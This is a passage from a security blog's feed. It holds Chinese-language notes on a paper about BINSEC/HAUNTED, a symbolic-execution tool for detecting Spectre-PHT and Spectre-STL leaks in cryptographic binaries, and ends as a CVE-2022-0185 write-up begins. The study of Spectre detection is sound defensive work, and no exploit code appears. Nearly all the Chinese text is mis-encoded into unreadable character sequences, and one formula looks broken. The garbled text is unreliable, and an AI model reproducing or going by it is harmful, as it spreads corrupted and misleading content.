ä¸‹è¢«å®‰å…¨åœ°æ³„éœ²ï¼ˆå³ï¼Œå¤±æ•ˆè·¯å¾„è°“è¯­ $\pi$ ä¸æ‰€æœ‰ $\widetilde{\pi}$ ä¸­çš„æœªå†³çš„æ¡ä»¶çš„ç»“åˆï¼ŒåŠ ä¸Š $\lambda$ ä¸­å¤±æ•ˆçš„ transient loads ï¼‰ï¼Œæ¥ä¸‹æ¥å…¶ä½¿ç”¨ä¸€ä¸ªç¬¦å·åŒ–çš„ store æ“ä½œæ¥æ›´æ–°ç¬¦å·åŒ–å†…å­˜å¹¶å°†è¯¥ store çš„å¤±æ•ˆæ·±åº¦è®¾ä¸º $\delta + \Delta$ï¼Œè¯¥å¤±æ•ˆæ·±åº¦ç”¨ä»¥ç¡®è®¤ store buffer ä¸­çš„å“ªä¸€ä¸ª store æ“ä½œåœ¨ç­‰å¾…ä¸­ã€å“ªä¸€ä¸ªå·²ä½œç”¨äºä¸»å­˜ä¸Š</p><p><img src="https://s2.loli.net/2023/01/28/HnTcajkiSudZODv.png" alt="image.png"></p><p><em>2) Evaluation of load expressions</em> ï¼šload è¡¨è¾¾å¼å¯ä»¥é€šè¿‡ <em>store-to-load forwarding</em> ä» store buffer ä¸­è·å–ä¸€ä¸ªå¸¦æœ‰åŒ¹é…åœ°å€çš„æœªå†³çš„ storeï¼Œä¹Ÿå¯ä»¥æ¨æµ‹æ€§åœ°ç»•è¿‡ store buffer ä¸­æœªå†³çš„ store å¹¶ä»ä¸»å­˜å–å€¼ï¼›ç›¸è¾ƒäºè€ƒè™‘ä¸€ä¸ª load è¡¨è¾¾å¼ä¸ store buffer ä¸­å…ˆå‰æ‰€æœ‰çš„ store ä¹‹é—´çš„äº¤ç»‡éƒ¨åˆ†ï¼Œç ”ç©¶è€…é€‰ç”¨ <em>read-over-write</em> æ¥è¾¨è¯†ä¸ä¸¢å¼ƒå¤§éƒ¨åˆ†çš„ load ä¸ å…ˆå‰çš„ store è‡ªç„¶åœ° commute çš„æƒ…å†µï¼› <em>Read-over-write</em> ä¸ºä¸€ä¸ªè‘—åçš„å¯¹æ•°ç»„ç†è®ºçš„ç®€åŒ–ï¼Œå…¶åœ¨æ±‚è§£å™¨ä¹‹å‰è§£å‡ºäº†ç¬¦å·åŒ–æ•°ç»„çš„ select æ“ä½œ</p><p>ä¸ºäº†é«˜æ•ˆåœ°å¯¹æ¯”ä¸‹æ ‡ï¼Œread-over-write ä¾èµ–äº <em>è¯­æ³•é¡¹ç­‰ä»·æ€§</em> ï¼ˆsyntactic term equalityï¼‰ï¼Œæ¯”è¾ƒå‡½æ•° $eq^{äº•} (i,j)$ ä»…åœ¨ $i$ ä¸ $j$ åœ¨è¯­æ³•ä¸Šç›¸ç­‰&#x2F;ä¸ç­‰æ—¶è¿”å› true&#x2F;falseï¼Œè‹¥é¡¹ä¹‹é—´æ— æ³•è¿›è¡Œæ¯”è¾ƒï¼Œåˆ™ä¸ºæœªå®šä¹‰ï¼Œè¡¨ç¤ºä¸º $âŠ¥$</p><blockquote><p>å…¬å¼é‡Œçš„è¿™ä¸ª <code>#</code> ä¸æ‡‚ä¸ºå•¥è€æ˜¯æ¸²æŸ“é”™è¯¯ï¼Œåªèƒ½ç”¨ <code>äº•</code> æ›¿ä»£ä¸€ä¸‹ï¼š( </p></blockquote><p>ä¸ºäº†é«˜æ•ˆåœ°åœ¨æ±‚è§£å™¨ä¹‹å‰è§£å‡º select æ“ä½œï¼Œread-over-write å®šä¹‰äº†ä¸€ä¸ªä¾èµ–äºä»¥ä¸‹è¯­æ³•é¡¹ç­‰ä»·æ€§çš„ $lookup _{mem}$ å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2023/01/28/5t1P2KsjeJirdFz.png" alt="image.png"></p><p>å…¶ä¸­ $\widehat{\mu _{n}} \triangleq store(\widehat{\mu} _{n-1} , j, \widehat{\varphi})$</p><p>ä¾‹å¦‚è€ƒè™‘è¿™æ ·çš„ä¸€ä¸ªå†…å­˜ $\widehat{\mu}$ ï¼š</p><p><img src="https://s2.loli.net/2023/01/28/s49Iic8LEz5hfO3.png" alt="image.png"></p><ul><li>$lookup _{mem}(\widehat{\mu},ebp - 8)$ è¿”å› $\widehat{\varphi}$</li><li>$lookup _{mem}(\widehat{\mu},ebp - 4)$ é¦–å…ˆä¼šæ¯”è¾ƒ $ebp - 4$ ä¸ $ebp - 8$ å¹¶ç¡®è®¤ä»–ä»¬æ˜¯ <em>è¯­ä¹‰ä¸ç­‰çš„</em> ï¼ˆsyntactically distinctï¼Œå³ $\lnot eq^(ebp - 4, eax) &#x3D; \perp$ï¼‰ï¼Œå› æ­¤ $select$ æ“ä½œå¹¶ä¸èƒ½è¢«ç®€åŒ–</li></ul><p>ä¸ºäº†é«˜æ•ˆåœ°å»ºæ¨¡ store-to-load forwardingï¼Œç ”ç©¶è€…å®šä¹‰äº†ä¸€ä¸ª <code>Algorithm 4</code>  ä¸­æ‰€ç¤ºçš„æ–°å‡½æ•° $lookup _{SB}$ï¼Œå…¶è¿”å› store buffer ä¸­ä¸€ç»„åŒ¹é…çš„ storeï¼›æ­¤å¤–ï¼Œ$lookup _{SB}$ æ¯ä¸ª load å¿…é¡»è¦è¢«å¤±æ•ˆåŒ–çš„æ·±åº¦ï¼Œå³å¯¹äºç›¸åŒåœ°å€çš„ä¸€ä¸ªæœ€è¿‘çš„ store çš„å¤±æ•ˆæ·±åº¦</p><p><img src="https://s2.loli.net/2023/01/28/MKj5Ln9BG1xJ3IH.png" alt="image.png"></p><p>æœ€ç»ˆç ”ç©¶è€…å®šä¹‰äº† <code>Algorithm 5</code> ä¸­æ‰€ç¤ºå‡½æ•° $lookup _{ite} (\widehat{\mu},i,\widetilde{\lambda},\delta)$ ï¼Œå…¶å°† $lookup _{SB}$ çš„ç»“æœç¼–ç ä¸ºä¸€ä¸ªç¬¦å·åŒ–çš„ä½¿ç”¨æ–°çš„å¸ƒå°”å˜é‡çš„ if-then-else è¡¨è¾¾å¼ï¼›è¯¥å‡½æ•°è¿”å› load è¡¨è¾¾å¼çš„å€¼ï¼Œå¹¶å°†è¿‡ç¨‹ä¸­å®šä¹‰çš„å¸ƒå°”å˜é‡æ·»åŠ åˆ° $\widetilde{\lambda}$ ä¸­ï¼›æ­¤å¤–ï¼Œä¸ºäº†å®ç° $BINSEC&#x2F;HAUNTED$ ï¼Œç ”ç©¶è€…ä½¿ç”¨å¸ƒå°”å˜é‡çš„åå­—æ¥ç¼–ç å…³äº load ä¸å‰é¢çš„ store çš„ä½ç½®çš„ä¿¡æ¯ï¼›å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¯èƒ½ä½¿ç”¨æ±‚è§£å™¨è¿”å›çš„åä¾‹æ¥å¾—çŸ¥è§¦å‘æ¼æ´æ˜¯ç»•è¿‡äº†å“ªä¸€ä¸ª storeï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬äº†è§£æ¼æ´å¹¶é‡æ„æ”»å‡»å›¾</p><p><img src="https://s2.loli.net/2023/01/28/Bq6ouwNsAkh2Ytz.png" alt="image.png"></p><p>å¯¹ä¸€ä¸ª load æŒ‡ä»¤çš„è¯„ä¼°å¦‚ <code>Algorithm 6</code> æ‰€ç¤ºï¼Œé¦–å…ˆè¯¥å‡½æ•°ä¼šè®¡ç®—ä¸‹æ ‡çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼Œæ¥ä¸‹æ¥å…¶ä¼šè°ƒç”¨ $lookup _{ite}$ è·å¾— load æŒ‡ä»¤å¯ä»¥å–çš„ç¬¦å·å€¼çš„é›†åˆï¼Œç¼–ç ä¸ºä¸€ä¸ªå•ç‹¬çš„ if-then-else è¡¨è¾¾å¼ $\widehat{\iota}$ ï¼Œå¹¶æ›´æ–° transient load çš„é›†åˆ $\widetilde{\lambda}$ ï¼›æœ€åå…¶ä¼šä½¿ç”¨ load çš„å€¼æ›´æ–°å¯„å­˜å™¨æ˜ å°„å¹¶å°†å…¶å¤±æ•ˆæ·±åº¦è®¾ä¸º $\delta + \Delta$ ï¼›å¤±æ•ˆæ·±åº¦ä¼šåœ¨æ¥ä¸‹æ¥çš„å¯¹æ¡ä»¶åˆ†æ”¯çš„è¯„ä¼°ä¸­ä½¿ç”¨ï¼Œä»¥ç¡®å®šè¯¥æ¡ä»¶æ˜¯å¦å†³å®šäºå†…å­˜</p><p><img src="https://s2.loli.net/2023/01/28/i2ous4LrlWd8vUg.png" alt="image.png"></p><p><em>3) Invalidate transient loads</em> ï¼šå½“æ›´å¤šçš„æœ€è¿‘çš„åŒ¹é…çš„ store éƒ½é€šè¿‡è®¾ç½®å¯¹åº”çš„å¸ƒå°”å˜é‡ä¸º false è€Œå¤±æ•ˆäº†ï¼Œtransient load çš„å€¼å¯ä»¥è¢«æ— æ•ˆåŒ–ï¼›äº <code>Algorithm 7</code> ä¸­å®šä¹‰çš„å‡½æ•° $retireSTL(\pi,\widetilde{\lambda},\delta)$ ä» transient load çš„é›†åˆ $\widetilde{\lambda}$ ä¸­ç§»é™¤æ‰€æœ‰çš„å¸¦æœ‰åœ¨ $\delta$ ä¸‹çš„å¤±æ•ˆæ·±åº¦çš„ loadï¼Œå¹¶åœ¨è·¯å¾„è°“è¯­ $\pi$ ä¸­å°†ç›¸åº”çš„å¸ƒå°”å˜é‡è®¾ä¸º falseï¼›ä¸ºäº†å¯è¯»æ€§ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼•å…¥ä¸€ä¸ªé€šè¿‡åŒæ—¶ä½¿ç”¨ $retirePHT$ ä¸ $retireSTL$ ä»¥åœæ­¢æ‰€æœ‰æ¨æµ‹çš„å‡½æ•° $retireALL$ </p><p><img src="https://s2.loli.net/2023/01/28/7Nqnw9sDomUP4Qh.png" alt="image.png"></p><h3 id="C-Theorems"><a href="#C-Theorems" class="headerlink" title="C. Theorems"></a>C. Theorems</h3><p>æœ¬èŠ‚ç ”ç©¶è€…å°†è¯æ˜ Haunted RelSE å¯¹äº SCT çš„æ­£ç¡®æ€§ä¸å®Œå¤‡æ€§ï¼ˆè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œï¼‰ï¼Œè¿™æ„å‘³ç€å½“ Haunted RelSE æŠ¥å‘Šäº†ä¸€ä¸ªè¿è§„ï¼ˆviolationï¼‰ï¼Œå…¶ä¸ºä¸€ä¸ªçœŸæ­£çš„ SCT è¿è§„ï¼ˆæ²¡æœ‰ä¸Šè¿‘ä¼¼ï¼‰ï¼Œä¸”å½“å…¶åœ¨æ·±åº¦ k ä¸ŠæŠ¥å‘Šæ²¡æœ‰è¿è§„æ—¶ï¼Œè¯¥ç¨‹åºåœ¨æ·±åº¦ k ä¸Šæ˜¯å®‰å…¨çš„ï¼ˆæ²¡æœ‰ä¸‹è¿‘ä¼¼ï¼‰ï¼›ä¸ºæ­¤ï¼Œç ”ç©¶è€…è¯æ˜äº† Haunted RelSE ä¸ Explicit RelSE æ˜¯ç­‰ä»·çš„ï¼Œä¸”å±•ç¤ºäº† Explicit RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œï¼ˆup-to-an-unrolling-boundï¼‰çš„ SCT è€Œè¨€åœ¨ä¸Šæ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</p><p><strong>Theorem 1.</strong> <em>Explicit RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œçš„æ¨æµ‹å¸¸æ•°æ—¶é—´è€Œè¨€åœ¨æ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</em></p><p>$Proof(sketch).$ è¯¥è¯æ˜ä¸ºä¸€ä¸ªç®€å•çš„å¯¹ RelSE å¯¹å¸¸æ•°æ—¶é—´çš„æ­£ç¡®æ€§ä¸å®Œå¤‡æ€§çš„è¯æ˜å¯¹æ¨æµ‹æ€§è¯­ä¹‰ï¼ˆspeculative semanticsï¼‰çš„æ‰©å±•ï¼›è¯¥æ‰©å±•éœ€è¦å±•ç¤ºï¼š</p><ul><li>1ï¼‰åœ¨ç¬¦å·æ‰§è¡Œä¸­ç¬æ€è·¯å¾„ä¸ŠæŠ¥å‘Šçš„è¿è§„å¯¹åº”åˆ°å…·ä½“ç¬æ€æ‰§è¡Œä¸­çš„è¿è§„</li><li>2ï¼‰è‹¥åœ¨å…·ä½“ç¬æ€æ‰§è¡Œä¸­æœ‰ä¸€ä¸ªè¿è§„ï¼Œåˆ™åœ¨ç¬¦å·æ‰§è¡Œä¸­æœ‰ä¸€ä¸ªè·¯å¾„ä¼šæŠ¥å‘Šè¯¥è¿è§„</li></ul><p>æ¥ä¸‹æ¥ç ”ç©¶è€…å°†å±•ç¤º Haunted RelSE ä¸ Explicit RelSE ç­‰ä»·</p><p><strong>Theorem 2.</strong> ï¼ˆEquivalence Explicit and Haunted RelSEï¼‰ <em>Haunted RelSE æ£€æµ‹åˆ°äº†ä¸€ä¸ªè¿è§„å½“ä¸”ä»…å½“ Explicit RelSE æ£€æµ‹åˆ°äº†ä¸€ä¸ªè¿è§„</em>  </p><p>åœ¨ <code>Appendix B</code> ä¸­ç ”ç©¶è€…ç»™å‡ºäº†ä¸€ä¸ªè¯æ˜è‰å›¾ï¼Œå…¶é¦–å…ˆå±•ç¤ºäº† Spectre-PHT çš„ç†è®ºï¼šåœ¨ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯åï¼ŒHaunted RelSE æ¢ç´¢çš„ä¸¤æ¡è·¯å¾„å®Œå…¨åœ°è·å–äº† Explicit RelSE ä¸­æ¢ç´¢çš„å››æ¡è·¯å¾„çš„è¡Œä¸ºï¼›ç ”ç©¶è€…æ¥ä¸‹æ¥å±•ç¤º Spectre-STL çš„ç†è®ºï¼šåœ¨ä¸€æ¡ load æŒ‡ä»¤ä¹‹åï¼ŒHaunted RelSE äº§ç”Ÿçš„å•æ¡è·¯å¾„å®Œå…¨è·å¾—äº† Explicit RelSE ä¸­å¤šæ¡è·¯å¾„çš„è¡Œä¸º</p><p><strong>Corollary 1.</strong> <em>Haunted RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œçš„æ¨æµ‹å¸¸æ•°æ—¶é—´è€Œè¨€åœ¨æ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</em> </p><h3 id="D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE"><a href="#D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE" class="headerlink" title="D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE"></a>D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE</h3><p>ç ”ç©¶è€…åŸºäºäºŒè¿›åˆ¶çº§çš„åˆ†æå™¨ BINSEC å®ç°äº† Haunted RelSE å¹¶ç§°ä¹‹ä¸º <code>BINSEC/HAUNTED</code> ï¼Œå…¶è·å–ä¸€ä¸ª x86 å¯æ‰§è¡Œæ–‡ä»¶ã€ç§˜å¯†è¾“å…¥çš„ä½ç½®ã€ä¸€ä¸ªåˆå§‹å†…å­˜é…ç½®ï¼ˆé€šå¸¸ä¸ºå®Œå…¨ç¬¦å·åŒ–çš„ï¼‰ã€æ¨æµ‹çš„æ·±åº¦ã€store buffer çš„å¤§å°ä½œä¸ºè¾“å…¥ï¼›BINSEC&#x2F;HAUNTED ä»¥æ·±åº¦ä¼˜å…ˆæœç´¢å¯¹ç¨‹åºè¿›è¡Œæ¢ç´¢ï¼Œä¼˜å…ˆå¤„ç†ç¬æ€è·¯å¾„ï¼Œå¹¶å¸¦ç€åä¾‹ï¼ˆå³ï¼Œå¯¼è‡´äº†æŸåçš„åˆå§‹é…ç½®ä¸æ¨æµ‹é€‰é¡¹ï¼‰æŠ¥å‘Š SCT æŸåï¼›å…¶ä½¿ç”¨å½“å‰ä½å‘é‡ç†è®ºä¸Šæœ€å¥½çš„ SMT æ±‚è§£å™¨ <code>Boolector</code></p><h1 id="0x05-EXPERIMENTAL-EVALUATION"><a href="#0x05-EXPERIMENTAL-EVALUATION" class="headerlink" title="0x05. EXPERIMENTAL EVALUATION"></a>0x05. EXPERIMENTAL EVALUATION</h1><p>ç ”ç©¶è€…åœ¨æœ¬è®ºæ–‡ä¸­å›ç­”äº†è¿™äº›ç ”ç©¶é—®é¢˜ï¼š</p><p><strong>RQ 1 Effectiveness.</strong> BINSEC&#x2F;HAUNTED æ˜¯å¦èƒ½å¤Ÿåœ¨çœŸå®ä¸–ç•Œçš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å‘ç° Spectre-PHT ä¸ Spectre-STL æŸåï¼Ÿ</p><p><strong>RQ2 Haunted vs Explicit.</strong> Haunted RelSE ä¸ Explicit RelSE å¯¹æ¯”èµ·æ¥å¦‚ä½•ï¼Ÿ</p><p><strong>RQ3 BINSEC&#x2F;HAUNTED vs. SoA tools.</strong> BINSEC&#x2F;Haunted ä¸æœ€å…ˆè¿›çš„å·¥å…·æ¯”èµ·æ¥å¦‚ä½•ï¼Ÿ</p><p>ä¸ºäº†å›ç­” RQ1 ä¸ RQ2ï¼Œç ”ç©¶è€…å¯¹æ¯”äº† <em>Explicit</em> ä¸ <em>Haunted</em> ç”¨ä»¥å…³ç³»ç¬¦å·æ‰§è¡Œçš„æ¢ç´¢ç­–ç•¥çš„æ€§èƒ½â€”â€”ä¸¤è€…éƒ½åº”ç”¨äº BINSEC&#x2F;HAUNTED â€”â€”åœ¨ä¸€ç»„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸ litmus benchmarkï¼ˆSections V-B ä¸ V-Cï¼‰ï¼›ä¸ºäº†å›ç­” RQ3ï¼Œç ”ç©¶è€…å¯¹æ¯”äº† BINSEC&#x2F;HAUNTED ä¸æœ€å…ˆè¿›çš„å·¥å…· KLEESpectre ä¸ Pitchforkï¼ˆSection V-Dï¼‰</p><p><strong>Legend.</strong> æœ¬èŠ‚ä¸­ï¼Œ$I _{x86}$ ä¸ºè¢«æ¢ç´¢çš„ä¸åŒ x86 æŒ‡ä»¤çš„æ•°é‡ï¼Œ $P$ ä¸ºæ¢ç´¢çš„è·¯å¾„æ•°é‡ï¼Œ$T$ ä¸ºæ€»çš„æ‰§è¡Œæ—¶é—´ï¼Œ<code>ä¸€ä¸ªè™«å­ç¬¦å·</code> ï¼ˆæ‰“ä¸å‡ºæ¥ï¼‰ä¸ºå‘ç°çš„æ¼æ´æ•°é‡ï¼Œâ³ä¸ºè¶…æ—¶æ•°é‡ï¼Œâœ“ ä¸ºè¢«è¯æ˜å®‰å…¨çš„ç¨‹åºæ•°é‡ï¼ŒÃ— ä¸ºè¢«è¯æ˜ä¸å®‰å…¨çš„ç¨‹åºæ•°é‡</p><h3 id="A-benchmark"><a href="#A-benchmark" class="headerlink" title="A. benchmark"></a>A. benchmark</h3><p>ç ”ç©¶è€…åœ¨ä¸€å°å¸¦æœ‰ <code>Intel(R) Xeon(R) CPU E3-1505M v6 @ 3.00GHz </code> å¤„ç†å™¨ä¸ 32GB å†…å­˜çš„æœºå™¨ä¸Šè¿›è¡Œå®éªŒï¼Œé™¤äº†åˆå§‹æ ˆæŒ‡é’ˆ $esp$ ä»¥å¤–ï¼ˆç±»ä¼¼äºrelated work[5]ï¼‰æ‰€æœ‰çš„è¾“å…¥éƒ½æ˜¯ç¬¦å·çš„ï¼Œä¸”æ•°æ®ç»“æ„ä¸ºé™æ€åˆ†é…çš„ï¼›ç”¨æˆ·éœ€è¦æ ‡è®°ç§˜å¯†ï¼Œå…¶ä½™æ‰€æœ‰çš„å€¼éƒ½æ˜¯å…¬å¼€çš„ï¼›ç ”ç©¶è€…å°†æ¨æµ‹æ·±åº¦è®¾ç½®ä¸º 200 æ¡æŒ‡ä»¤å¹¶å°† store buffer çš„å¤§å°è®¾ç½®ä¸º 20 æ¡æŒ‡ä»¤ï¼Œæ­¤å¤–ï¼Œç ”ç©¶è€…ä»…è€ƒè™‘é¡ºåºæ‰§è¡Œä¸­çš„é—´æ¥è·³è½¬ç›®æ ‡å¹¶å®ç°äº†ä¸€ä¸ª <em>å½±å­æ ˆ</em> ä»¥é™åˆ¶è¿”å›æŒ‡ä»¤åœ¨ä¸€ä¸ªåˆé€‚çš„è¿”å›ä½ç½®ï¼›è€ƒè™‘ç¬æ€è·³è½¬ç›®æ ‡éœ€è¦åœ¨ä»»æ„ä½ç½®å»ºæ¨¡é—´æ¥è·³è½¬ï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è™½ç„¶å¯è¡Œä½†éå¸¸æ£˜æ‰‹</p><p>ç ”ç©¶è€…é€šè¿‡å¦‚ä¸‹ç¨‹åºè¯„ä¼° BINSEC&#x2F;HAUNTEDï¼š</p><ul><li><code>litmus-pht</code> ï¼š16 ä¸ªæ¥è‡ªäº Pitchfork çš„ä¿®æ”¹è¿‡çš„ Paul Kocher çš„ litmus tests é›†åˆçš„å°çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆlitmus testsï¼‰ç”¨ä»¥ Spectre-PHT</li><li><code>litmus-pht-patched</code> ï¼šæ·»åŠ äº†ä¸‹æ ‡æ©ç ï¼ˆindex maskingï¼‰çš„ <code>litmus-pht</code></li><li><code>litmus-stl</code> ï¼šæ–°çš„ä¸€ç»„ç”¨ä»¥ Spectre-STL çš„ litmus tests</li><li>æ¥è‡ª OpenSSL ä¸ Libsodium å¯†ç å­¦åº“ï¼ˆè¯¦è§ Table Iï¼‰ çš„å¯†ç å­¦åŸè¯­ï¼ŒåŒ…æ‹¬å¹¶æ‰©å±•è‡³åœ¨ <a href="https://doc.libsodium.org/secret-key_cryptography/secretbox">[5]</a> ä¸­è¢«åˆ†æçš„é‚£äº›</li></ul><p>ç¨‹åºä½¿ç”¨ gcc 10.1.0 ç¼–è¯‘åˆ° 32 ä½ x86 æ¶æ„ä¸Šï¼Œlitmus tests è¢«ä»¥ <code>-fno-stack-protector</code> é€‰é¡¹è¿›è¡Œç¼–è¯‘ï¼ŒSpectre-STL çš„ litmus tests é¢å¤–æ·»åŠ äº† <code>-no-pie</code> ä¸ <code>-fno-pic</code> ä»¥æ’é™¤ç”±è¿™äº›é€‰é¡¹å¼•å…¥çš„æŸåï¼ˆå‚è§ Section VIï¼‰ï¼›ç”±äºåŒä¸€åŸå› ï¼Œ<code>donna</code> ä¸ <code>tea</code> ä¸å¸¦æœ‰ <code>-fno-stack-protector</code> ç¼–è¯‘é€‰é¡¹ï¼Œä¼˜åŒ–çº§åˆ«ä¸º <code>O1ã€O2ã€O3</code> ä¸ <code>Ofast</code>ï¼›Libsodium ç”±é»˜è®¤çš„ Makefile è¿›è¡Œç¼–è¯‘ï¼ŒOpenSSL å¼€å¯äº† <code>O3</code> ä¼˜åŒ–ï¼Œä¸¤è€…éƒ½å¼€å¯äº† stack protector</p><p><img src="https://s2.loli.net/2023/01/29/4ZgLHYdQ69ibICM.png" alt="image.png"></p><p><em>Note on Stack Protectors</em> ï¼šç”± stack protector å¼•å…¥çš„è§£å†³é”™è¯¯çš„ä»£ç éå¸¸å¤æ‚ä¸”åŒ…å«äº†è®¸å¤šæ— æ³•åœ¨çº¯å‡€çš„ç¬¦å·æ‰§è¡Œä¸­åˆ†æçš„ç³»ç»Ÿè°ƒç”¨ï¼ŒBINSEC&#x2F;HAUNTED åœ¨ç³»ç»Ÿè°ƒç”¨ä¸Šåœæ­¢è·¯å¾„æ‰§è¡Œä¸”æ¯ä¸ªç¨‹åºä»…è·³è½¬åˆ° stack protector çš„ä»£ç ä¸€æ¬¡ï¼Œè¿™æ„å‘³ç€å…¶å¯èƒ½ä¼šé”™è¿‡ä¸€äº›æœªè¢«æ¢ç´¢çš„ä»£ç ä¸­çš„æŸåï¼›æ­¤å¤–ï¼Œå¯¹äº litmus testsã€<code>tea</code>ã€<code>donna</code>ï¼Œè¶…æ—¶æ—¶é•¿è¢«è®¾ç½®ä¸º 1 å°æ—¶ï¼Œä½†å¯¹äºåŒ…å« stack protector çš„ä»£ç åˆ™å»¶é•¿è‡³ 6 å°æ—¶ï¼ˆLibsodium ä¸ OpenSSLï¼‰</p><h1 id="0x06-NEW-VULNERABILITIES-AND-MITIGATIONS"><a href="#0x06-NEW-VULNERABILITIES-AND-MITIGATIONS" class="headerlink" title="0x06. NEW VULNERABILITIES AND MITIGATIONS"></a>0x06. NEW VULNERABILITIES AND MITIGATIONS</h1><h1 id="0x07-RELATED-WORK"><a href="#0x07-RELATED-WORK" class="headerlink" title="0x07. RELATED WORK"></a>0x07. RELATED WORK</h1><h1 id="0x08-CONCLUTION"><a href="#0x08-CONCLUTION" class="headerlink" title="0x08. CONCLUTION"></a>0x08. CONCLUTION</h1><p>ç ”ç©¶è€…æå‡ºäº† Haunted RelSEï¼Œä¸€ç§åŸºäºå…³ç³»ç¬¦å·æ‰§è¡Œçš„ç”¨ä»¥é™æ€æ£€æµ‹ Spectre-PHT ä¸ Spectre-STL æ¼æ´çš„æŠ€æœ¯ï¼›ç‰¹åˆ«åœ°ï¼ŒHaunted RelSE èƒ½å¤Ÿé€šè¿‡åŒæ—¶æ¨ç†å¸¸è§„æ‰§è¡Œä¸ç¬æ€æ‰§è¡Œä»¥æ˜¾è‘—åœ°å‡å°‘å¯»å€æ¨æµ‹è·¯å¾„çš„å¼€é”€ï¼›ç ”ç©¶è€…å°† Haunted RelSE åº”ç”¨äºä¸€ä¸ªå…³ç³»ç¬¦å·æ‰§è¡Œå·¥å…· <code>BINSEC/HAUNTED</code> ä¸­ï¼›æ®ç ”ç©¶è€…çš„å®éªŒç»“æœæ‰€ç¤ºï¼ŒHaunted RelSE ä¸ºè¿ˆå‘å¯æ‰©å±•çš„å¯¹ Spectre attacks çš„ä¸€æ­¥ï¼›å¯¹äº Spectre-PHTï¼ŒHaunted RelSE å¯ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹æå¤§åœ°æå‡åˆ†æé€Ÿåº¦ï¼Œåœ¨å¯¹ä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œä¸­çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†ææ¨æµ‹è¯­ä¹‰å¤æ‚æ€§è¿›è¡Œå‰ªæï¼›å¯¹äº Spectre-STLï¼ŒBINSEC&#x2F;HAUNTED æ˜¯ç¬¬ä¸€ä¸ªå¯ä»¥å½»åº•åˆ†æçœŸå®ä¸–ç•Œä¸­è¾ƒå°çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶å¹¶åœ¨ä¸­ç­‰å¤§å°çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ¼æ´çš„å·¥å…·</p><p>æœ€åï¼Œç ”ç©¶è€…é€šè¿‡ BINSEC&#x2F;HAUNTEDï¼ŒæŠ¥å‘Šäº†ä¸€ä¸ªæ ‡å‡†çš„å¯¹ Spectre-PHT çš„é˜²æŠ¤å¯ä»¥è½»æ˜“åœ°å¼•å…¥ Spectre-STL æ¼æ´å¹¶æå‡ºäº†ä¿®å¤æ–¹æ³•ï¼Œä¸”å‘ç°äº†ä¸€ä¸ªè‘—åçš„ç”¨äºç¼–è¯‘ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶çš„ GCC ç¼–è¯‘é€‰é¡¹ä¼šå¼•å…¥ Spectre-STL</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¬¼ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="https://arttnba3.github.io/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="äºŒè¿›åˆ¶åˆ†æ" scheme="https://arttnba3.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
    <category term="è®ºæ–‡ç¬”è®°" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Spectre" scheme="https://arttnba3.github.io/tags/Spectre/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x09ã€‘CVE-2022-0185 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="https://arttnba3.github.io/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>https://arttnba3.github.io/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T01:04:19.000Z</published>
    <updated>2023-05-28T01:30:53.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿˜æ˜¯ mount å¥½</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> æ˜¯ 2022 å¹´åˆçˆ†å‡ºæ¥çš„ä¸€ä¸ªä½äº filesystem context ç³»ç»Ÿä¸­çš„ <code>fsconfig</code> ç³»ç»Ÿè°ƒç”¨ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œå¯¹äºæœ‰ç€ 